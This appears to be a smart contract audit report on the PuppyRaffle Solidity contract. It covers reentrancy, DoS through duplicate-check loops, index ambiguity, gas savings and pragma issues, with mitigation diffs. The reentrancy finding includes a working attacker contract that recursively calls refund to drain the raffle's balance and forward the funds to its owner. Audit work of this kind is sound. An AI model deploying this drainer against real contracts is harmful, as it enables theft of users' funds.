## Highs

### [H-1] Reentracy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance.

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

**Proof of Code:**

<details>
<summary>Code</summary>

Place the following into `PuppyRaffleTest.t.sol`:

```javascript
    function test_reentracyRefund() public {
        // Let's enter 15 players
        uint256 playersNum = 15;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        console.log("starting puppyRaffle contract balance: ", address(puppyRaffle).balance);

        // Let's attack
        hoax(attacker, entranceFee);
        console.log("starting attacker balance: ", attacker.balance);
        attack.attack{value: entranceFee}();
        uint256 expectedBalance = entranceFee * playersNum + entranceFee;

        // Let's see how much ETH we have now
        console.log("ending puppyRaffle contract balance: ", address(puppyRaffle).balance);
        console.log("ending attacker balance: ", attacker.balance);
        assertEq(attacker.balance, expectedBalance);
    }
```

And this contract as well.

```javascript
contract AttackPuppyRaffle {
    address payable private immutable i_puppyRaffle;
    address payable private immutable i_owner;

    uint256 private s_index;

    constructor(address _target, address _owner) {
        i_puppyRaffle = payable(_target);
        i_owner = payable(_owner);
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        uint256 entranceFee = _getEntranceFee();
        _enterRaffle(entranceFee, players);
        s_index = _getIndex();
        _refund(s_index);
    }

    function _getEntranceFee() internal returns (uint256 entranceFee) {
        (, bytes memory data) = i_puppyRaffle.call(abi.encodeWithSignature("entranceFee()"));
        entranceFee = abi.decode(data, (uint256));
    }

    function _getIndex() internal returns (uint256 index) {
        (, bytes memory data) =
            i_puppyRaffle.call(abi.encodeWithSignature("getActivePlayerIndex(address)", address(this)));
        index = abi.decode(data, (uint256));
    }

    function _enterRaffle(uint256 _entranceFee, address[] memory _players) internal {
        (bool success,) =
            i_puppyRaffle.call{value: _entranceFee}(abi.encodeWithSignature("enterRaffle(address[])", _players));
        require(success, "AttackPuppyRaffle: Failed to enter raffle");
    }

    function _refund(uint256 index) internal {
        (bool success,) = i_puppyRaffle.call(abi.encodeWithSignature("refund(uint256)", index));
        require(success, "AttackPuppyRaffle: Failed to refund");
    }

    function _stealMoney() internal {
        if (i_puppyRaffle.balance > 0) {
            _refund(s_index);
        } else {
            (bool success,) = i_owner.call{value: address(this).balance}("");
            require(success, "AttackPuppyRaffle: Failed to send funds to owner");
        }
    }
}
```

</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

## Mediums

### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incremeting gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle stats will be dramatically lower than those who enter later. Every additional address in the `players`array, is an additional check the loop will have to make.

```javascript
        // @audit DoS
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

**Proof of Concept:** Add the following to the `PuppyRaffleTest.t.sol` test file;

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: ~6252047 gas
- 2st 100 players: ~18068137 gas

This is more than 3x more expensensive for the second 100 players.

<details>
<summary>Code</summary>

```javascript
    function test_denialOfService() public {
        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        // see how much gas it costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        console.log("Gas cost of the first 100 players", gasUsedFirst);

        // now for the 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        // see how much gas it costs
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
        uint256 gasEndSecond = gasleft();

        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;

        console.log("Gas cost of the 2nd 100 players", gasUsedSecond);

        assert(gasUsedSecond > gasUsedFirst);
    }
```

</details>

**Recommended Mitigation:** There a few recommended mitigations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uin256 id, and the mapping would be a player address mapped to the raffle Id.

```diff
+   mapping(address => uint256) public addressToRaffleId;
+   uint256 public constant RAFFLE_ID = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = RAFFLE_ID;
        }

-       // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(addressToRaffleId[newPlayers[i]] != RAFFLE_ID, "PuppyRaffle: Duplicate player");
+       }
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }
```

## Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existant players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle.

**Description:** if a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```javascript
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        // @audit if the player is at index 0, it'll return 0 and a player might think they are not active!
        return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation

**Recommended Mitigation:** The easist recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active.

## Gas

### [G-1]: Unchaged state variables should be declared constant or immutable.

**Description:** Reading from storage is much more expensive than reading from a constant or immutable variable.

**Recommended Mitigation:** Add the immutable or constant attribute to state variables that never change or are set only in the constructor.

Instances:

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] `Public` functions not used internally could be marked `external`.

**Recommended Mitigation:** Instead of marking a function as `public`, consider marking it as `external` if it is not used internally.

Instances:

- `PuppyRaffle::enterRaffle` should be `external`
- `PuppyRaffle::refund` should be `external`
- `PuppyRaffle::tokenURI` should be `external`

### [G-3] Loop condition contains `state_variable.length` that could be cached outside.

**Recommended Mitigation:** Cache the lengths of storage arrays if they are used and not modified in for loops.

```diff
+   uint256 playerLength = players.length - 1;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength; i++) {
```

## Informational

### [I-1] Solidity pragma should be specific, not wide

**Description:**

<details><summary>1 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

  ```solidity
  pragma solidity ^0.7.6;
  ```

</details>

**Recommended Mitigation:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

### [I-2] Usign an outdated version of solidity is not recommended.

**Description:** `solc` frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

<details><summary>1 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

  ```solidity
  pragma solidity ^0.7.6;
  ```

</details>

**Recommended Mitigation:** Consider using a newer version of Solidity like `0.8.18`.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

### [I-3] Missing checks for `address(0)` when assigning values to address state variables.

**Description:** Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>

- Found in src/PuppyRaffle.sol [Line: 74](src/PuppyRaffle.sol#L74)

  ```solidity
          feeAddress = _feeAddress;
  ```

- Found in src/PuppyRaffle.sol [Line: 224](src/PuppyRaffle.sol#L224)

  ```solidity
          feeAddress = newFeeAddress;
  ```

</details>
